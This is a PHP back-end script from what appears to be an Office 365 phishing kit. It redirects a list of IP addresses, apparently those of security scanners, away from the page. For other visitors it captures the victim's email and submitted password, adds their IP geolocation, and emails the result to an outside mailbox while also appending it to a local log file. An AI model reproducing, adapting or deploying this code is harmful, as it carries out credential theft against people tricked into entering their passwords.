<?php

$deny = array("13.239.62.44", "54.233.137.119", "162.243.187.126", "46.101.94.163", "31.6.58.60", "87.89.48.69", "92.23.59.24", "5.62.41.36", "154.70.155.194", "18.231.48.187", "46.101.94.163", "46.101.119.24", "52.65.198.212", "54.252.230.248", "52.67.159.194", "40.118.205.169", "199.249.230.77", "50.125.66.169", "194.99.104.130", "51.77.0.80", "40.118.205.169", "199.249.230.77", "50.125.66.169", "196.251.88.139", "185.93.2.59", "196.251.88.139", "84.93.42.239", "196.52.84.53", "82.102.27.51", "5.62.41.37", "165.227.0.128", "92.23.56.101", "185.229.190.136", "50.125.67.177", "104.215.89.177", "188.166.98.249", "138.91.146.139", "50.125.67.177", "159.203.0.156", "188.166.63.71", "165.227.163.166", "139.59.4.194", "142.93.74.68", "64.246.187.119", "157.230.173.0", "52.67.130.154", "40.90.218.216", "72.12.194.91", "103.234.220.197", "162.247.74.204", "40.91.75.16", "72.12.194.91", "103.234.220.197", "162.247.74.204", "18.228.44.24", "72.12.194.150.79", "71.189.173.38", "18.228.44.24", "72.12.194.90", "211.25.3.117", "185.104.120.3", "103.234.220.195", "196.52.84.31", "84.92.138.149", "107.155.49.126", "185.93.2.109", "40.91.75.16");
if (in_array ($_SERVER['REMOTE_ADDR'], $deny)) {
   header("location: https://example.com/");
   exit();
} 



require_once('geoplugin.class.php');
session_start();



$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
}

$message .= "--------------OFFICE------------------\n";
$message .= "EMAIL: ".$_SESSION["mail"]."\n";
$message .= "PASS: ".$_POST['passwd']."\n";
$message .= "link: ".$_SESSION["lf"]."\n";
$message .= "---------=IP Address & Date=-----------\n";
$message .= "IP Address: ".$ip."\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "---------------JSARZ-------------\n";

$sent ="kr1st0f3rz@pm.me";


$subject = "OFFICE Below voice 365 Log From - " .$ip;
$headers = "From: BOX OFFICE <customer@floor.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
              
mail($sent,$subject,$message,$headers);

	
$file=fopen("logs.txt","a+") or exit("Unable to open file!");


   fwrite($file,$message."\n");

fclose($file);
    
        
header("Location: ");

?>
